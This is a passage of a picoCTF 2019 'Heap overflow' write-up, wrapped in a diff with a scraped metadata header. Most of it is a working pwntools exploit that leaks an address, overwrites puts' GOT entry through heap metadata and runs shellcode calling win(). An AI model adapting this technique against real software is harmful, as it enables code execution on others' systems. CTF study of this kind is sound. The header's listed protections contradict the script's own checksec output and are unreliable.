@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Heap_overflow.md
+CHALLENGE: CTFs/2019_picoCTF/Heap_overflow.md at master · Dvd848/CTFs
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: heap_exploitation
+DIFFICULTY: Unknown
+PROTECTIONS: NX, PIE, Canary, RELRO
+KEY_FUNCTIONS: gets
+KEY_TECHNIQUE: Writeup for CTFs/2019_picoCTF/Heap_overflow.md at master · Dvd848/CTFs — heap_exploitation exploitation technique.
+---
+p;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;' . format ( hex ( exe . symbols [ "win" ]))) The first few bytes don't get overwritten, and they allow us to jump over the nop area, which will be destroyed, straight to the real shellcode which in our case just calls win . Now, when puts gets called, our shellcode is executed and we get the flag. # First, generate a pwntools template using: # pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln #=========================================================== #                    EXPLOIT GOES HERE #=========================================================== # Arch:     i386-32-little # RELRO:    Partial RELRO # Stack:    Canary found # NX:       NX disabled # PIE:      No PIE (0x8048000) # RWX:      Has RWX segments import os if shell is not None : shell . set_working_directory ( os . path . dirname ( remote_path )) io = start () io . recvuntil ( "Oops! a new developer copy pasted and printed an address as a decimal... \n " ) address = int ( io . recvline ()) log . info ( "Address of fullname: {}" . format ( hex ( address ))) log . info ( "Address of win(): {}" . format ( hex ( exe . symbols [ "win" ]))) shellcode = asm ( 'jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;' . format ( hex ( exe . symbols [ "win" ]))) log . info ( "shellcode: \n {}" . format ( hexdump ( shellcode ))) payload = shellcode + ( 'B' * ( 664 - len ( shellcode ))) + p32 ( 100 , sign = "signed" ) + p32 ( - 4 , sign = "signed" ) + p32 ( exe . got [ "puts" ] - 12 ) + p32 ( address ) log . info ( "payload: \n {}" . format ( hexdump ( payload ))) io . sendlineafter ( "Input fullname" , payload ) io . sendlineafter ( "Input lastname" , "a" ) print io . recvall () Output: root@kali:/media/sf_CTFs/pico/Heap_overflow # python exploit.py [*] '/media/sf_CTFs/pico/Heap_overflow/vuln' Arch:     i386-32-little RELRO:    Partial RELRO Stack:    Canary found NX
